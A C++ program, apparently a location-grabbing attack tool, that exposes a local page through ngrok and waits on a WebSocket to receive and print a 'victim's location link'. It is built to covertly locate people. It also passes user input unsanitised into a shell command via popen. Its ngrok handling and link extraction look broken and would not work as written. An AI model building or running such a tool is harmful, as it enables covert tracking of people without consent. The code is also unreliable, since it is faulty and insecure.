#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <iostream>
#include <string>

namespace beast = boost::beast; // from <boost/beast.hpp>
namespace http = beast::http;   // from <boost/beast/http.hpp>
namespace websocket = beast::websocket; // from <boost/beast/websocket.hpp>
using tcp = boost::asio::ip::tcp; // from <boost/asio/ip/tcp.hpp>

std::string executeCommand(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) {
        return "Error: Failed to execute the command";
    }
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

int main() {
    std::string ngrokAuthorities;
    std::cout << "Enter your ngrok auth token: ";
    std::getline(std::cin, ngrokAuthorities);

    std::string hostCommand = "ngrok http -auth " + ngrokAuthorities + " 80"; // Modify the command to include the ngrok token and desired port (80 for HTTP)
    std::string ngrokOutput = executeCommand(hostCommand.c_str());

    // Extract the dynamically generated URL from the ngrok output
    std::string hostedLink;
    size_t startPos = ngrokOutput.find("Forwarding");
    if (startPos != std::string::npos) {
        size_t endPos = ngrokOutput.find("http", startPos);
        if (endPos != std::string::npos) {
            hostedLink = ngrokOutput.substr(startPos, endPos - startPos);
        }
    }

    if (!hostedLink.empty()) {
        std::cout << "HTML page hosted at: " << hostedLink << std::endl;
    } else {
        std::cout << "Error: Failed to retrieve the hosted link." << std::endl;
        return 1;
    }

    std::cout << "Waiting for victim's response..." << std::endl;

    boost::asio::io_context io;

    // WebSocket server setup
    tcp::acceptor acceptor(io, tcp::endpoint(tcp::v4(), 8081));
    websocket::stream<tcp::socket> ws(io);

    acceptor.accept(ws.next_layer());

    ws.accept();

    beast::flat_buffer buffer;
    ws.read(buffer);

    std::string locationLink = beast::buffers_to_string(buffer.data());

    if (!locationLink.empty()) {
        std::cout << "Victim's location link: " << locationLink << std::endl;
    } else {
        std::cout << "Error: Failed to receive the location link." << std::endl;
        return 1;
    }

    return 0;
}
